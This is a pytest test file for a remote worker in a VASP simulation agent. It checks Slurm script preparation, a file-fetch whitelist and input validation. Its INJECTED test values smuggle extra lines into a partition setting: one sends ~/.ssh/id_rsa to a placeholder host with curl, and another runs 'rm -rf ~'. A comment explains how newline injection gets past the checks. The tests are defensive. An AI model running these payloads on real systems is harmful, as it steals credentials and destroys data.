import base64
import json
import subprocess
import sys
from pathlib import Path
from types import SimpleNamespace as NS

import pytest

import vasp_agent.remote.remote_worker as worker
from vasp_agent.chat.ai_agent import Toolbox


def test_worker_source_and_payload_travel_on_stdin(tmp_path, monkeypatch):
    from vasp_agent.remote.remote_compute import RemoteCompute
    servers = tmp_path / 'servers'
    servers.mkdir()
    (servers / 'test.json').write_text('{"host":"example.org","user":"tester","port":22}')
    root = tmp_path / "remote's quoted space"
    folder = root / 'jobs/si'
    folder.mkdir(parents=True)
    expected = {'status': 'prepared', 'text': '中文 \\ " \' $HOME `code`\nnext'}
    (folder / 'workflow-state.json').write_text(json.dumps(expected), encoding='utf-8')
    config = dict(root=str(root), python='/opt/python', potcar_library='/data/PBE', vasp_env='/opt/env.sh')
    (servers / 'test.compute.json').write_text(json.dumps(config))
    # Windows test paths are valid for the worker but not the POSIX connection config.
    remote = object.__new__(RemoteCompute)
    remote.config = config
    remote.server = 'test'
    from vasp_agent.remote.remote_servers import Servers
    remote.servers = Servers(tmp_path)
    original_run = subprocess.run
    def transport(args, **kwargs):
        assert args[-1] == '/opt/python -X utf8 -'
        assert '\n' not in args[-1]
        return original_run([sys.executable, '-X', 'utf8', '-'], **kwargs)
    monkeypatch.setattr(subprocess, 'run', transport)
    assert remote.call('status', 'si')['workflow-state.json'] == expected


def test_remote_submit_hidden_without_capability(tmp_path):
    box = Toolbox(tmp_path)
    assert 'remote_submit' not in [t['name'] for t in box.schemas()]
    assert not box.call('remote_submit', {'server': 'test', 'job_name': 'si'})['ok']


def test_remote_fetch_whitelist_excludes_potcar(tmp_path):
    folder = tmp_path / 'jobs/si'
    folder.mkdir(parents=True)
    (folder / 'POTCAR').write_text('not for transfer')
    (folder / 'report.json').write_text('{"status":"test"}')
    result = worker.dispatch({'config': {'root': str(tmp_path)}, 'action': 'fetch', 'job_name': 'si'})
    assert set(result['files']) == {'report.json'}
    assert base64.b64decode(result['files']['report.json']['data']) == (folder / 'report.json').read_bytes()


def test_remote_submission_uncertainty_is_not_retried(tmp_path, monkeypatch):
    folder = tmp_path / 'jobs/si'
    folder.mkdir(parents=True)
    (folder / 'remote-submission.json').write_text('{"status":"submission_uncertain","job_id":null}')
    def no_launch(*args, **kwargs):
        raise AssertionError('must not resubmit')
    monkeypatch.setattr(worker.subprocess, 'run', no_launch)
    result = worker.dispatch({'config': {'root': str(tmp_path)}, 'action': 'submit', 'job_name': 'si'})
    assert result['status'] == 'submission_uncertain'


def test_job_name_cannot_escape_remote_root(tmp_path):
    with pytest.raises(ValueError, match='任务名'):
        worker.dispatch({'config': {'root': str(tmp_path)}, 'action': 'fetch', 'job_name': '../escape'})


@pytest.mark.parametrize('parallel', [1, 3])
def test_remote_prepare_uses_server_library_and_script(tmp_path, monkeypatch, parallel):
    import vasp_agent.workflow.full_workflow as full_workflow
    release = tmp_path / 'release'
    release.mkdir()
    (tmp_path / 'deployment.json').write_text(json.dumps({'release': str(release)}))
    seen = []
    def fake_prepare(args):
        seen.append(args)
        from pathlib import Path
        folder = Path(args.workdir)
        folder.mkdir(parents=True)
        (folder / 'manifest.json').write_text('{"ready":true}')
    monkeypatch.setattr(full_workflow, 'prepare_full', fake_prepare)
    monkeypatch.setattr(worker, 'inspect_environment', lambda *a: {'executable_sha256': 'fixture', 'environment_sha256': 'fixture', 'executable': '/fake/vasp_std'})
    env_script = tmp_path / 'env.sh'
    env_script.write_text('#!/bin/bash\n')
    monkeypatch.setattr(worker.subprocess, 'run', lambda *args, **kwargs: NS(returncode=0))
    config = dict(root=str(tmp_path), python='/opt/python', potcar_library='/data/PBE',
                  vasp_env=str(env_script), partition='compute', ntasks=8, walltime='04:00:00')
    result = worker.dispatch({'config': config, 'action': 'prepare', 'job_name': 'si',
        'structure': base64.b64encode(b'structure fixture').decode(),
        'parameters': {'encut': 520, 'mesh': [8,8,8], 'nbands': 16, 'relax_mode': 'cell',
                       'parallel_tests': parallel, 'cores_per_test': 8}})
    assert seen[0].potcar_library == '/data/PBE'
    assert result['manifest']['ready']
    script = (tmp_path / 'jobs/si/submit.slurm').read_text()
    assert 'srun vasp_std' in script
    assert f'#SBATCH --ntasks={parallel * 8}' in script
    assert seen[0].parallel_tests == parallel
    assert result['resources']['ntasks'] == parallel * 8
    from vasp_agent.remote.remote_worker import check_resources
    limits = dict(partition='compute', nodes=1, cores=8, walltime='04:00:00')
    if parallel > 1:
        with pytest.raises(ValueError, match='上限'):
            check_resources(script, limits)


# Both script builders interpolate partition and walltime straight into
# submit.slurm, and a profile is an ordinary local file. A newline turns the
# rest of the value into a separate '#SBATCH' directive or shell command:
# capacity_preflight parses the finished script line by line, so the injected
# line ends the capture and it validates the truncated value; 'bash -n' only
# checks syntax, which injected whole lines satisfy. The two builders once
# disagreed about whether to check at all, so both are covered here.
INJECTED = [
    'compute\n#SBATCH --gpus=8\ncurl -s http://example.invalid/$(cat ~/.ssh/id_rsa)',
    'compute; rm -rf ~',
    '',
]


@pytest.mark.parametrize('value', INJECTED)
def test_prepare_rejects_injected_partition(tmp_path, monkeypatch, value):
    import vasp_agent.workflow.full_workflow as full_workflow
    release = tmp_path / 'release'
    release.mkdir()
    (tmp_path / 'deployment.json').write_text(json.dumps({'release': str(release)}))
    env_script = tmp_path / 'env.sh'
    env_script.write_text('#!/bin/bash\n')
    monkeypatch.setattr(worker, 'inspect_environment', lambda *a: {'executable_sha256': 'fixture'})
    monkeypatch.setattr(worker.subprocess, 'run', lambda *a, **k: NS(returncode=0))
    def no_prepare(args):
        raise AssertionError('a profile that cannot build a valid script must not prepare')
    monkeypatch.setattr(full_workflow, 'prepare_full', no_prepare)
    config = dict(root=str(tmp_path), python='/opt/python', potcar_library='/data/PBE',
                  vasp_env=str(env_script), partition=value, ntasks=8, walltime='04:00:00')
    with pytest.raises(ValueError, match='分区'):
        worker.dispatch({'config': config, 'action': 'prepare', 'job_name': 'si',
            'structure': base64.b64encode(b'structure fixture').decode(),
            'parameters': {'encut': 520, 'mesh': [8,8,8], 'nbands': 16, 'relax_mode': 'cell'}})
    assert not (tmp_path / 'jobs/si/submit.slurm').exists()


@pytest.mark.parametrize('value', ['04:00:00\n#SBATCH --gpus=8', 'four hours', ''])
def test_prepare_rejects_invalid_walltime(tmp_path, monkeypatch, value):
    import vasp_agent.workflow.full_workflow as full_workflow
    release = tmp_path / 'release'
    release.mkdir()
    (tmp_path / 'deployment.json').write_text(json.dumps({'release': str(release)}))
    env_script = tmp_path / 'env.sh'
    env_script.write_text('#!/bin/bash\n')
    monkeypatch.setattr(worker, 'inspect_environment', lambda *a: {'executable_sha256': 'fixture'})
    monkeypatch.setattr(worker.subprocess, 'run', lambda *a, **k: NS(returncode=0))
    monkeypatch.setattr(full_workflow, 'prepare_full',
                        lambda args: pytest.fail('invalid walltime must not prepare'))
    config = dict(root=str(tmp_path), python='/opt/python', potcar_library='/data/PBE',
                  vasp_env=str(env_script), partition='compute', ntasks=8, walltime=value)
    with pytest.raises(ValueError, match='运行时间'):
        worker.dispatch({'config': config, 'action': 'prepare', 'job_name': 'si',
            'structure': base64.b64encode(b'structure fixture').decode(),
            'parameters': {'encut': 520, 'mesh': [8,8,8], 'nbands': 16, 'relax_mode': 'cell'}})
    assert not (tmp_path / 'jobs/si/submit.slurm').exists()


@pytest.mark.parametrize('release', [str(Path(__file__).parent), '/work/agent/releases/abc'])
def test_engine_release_accepts_any_absolute_form(release):
    from vasp_agent.remote.remote_worker import engine_release
    if not Path(release).is_absolute():
        pytest.skip('POSIX form is not absolute on this platform')
    assert engine_release({'release': release}) == release


@pytest.mark.parametrize('meta', [{}, {'release': 'relative/release'}, {'release': 1}, {'release': '/a\n/b'}])
def test_engine_release_rejects_unnamed_release(meta):
    from vasp_agent.remote.remote_worker import engine_release
    with pytest.raises(ValueError, match='重新部署'):
        engine_release(meta)
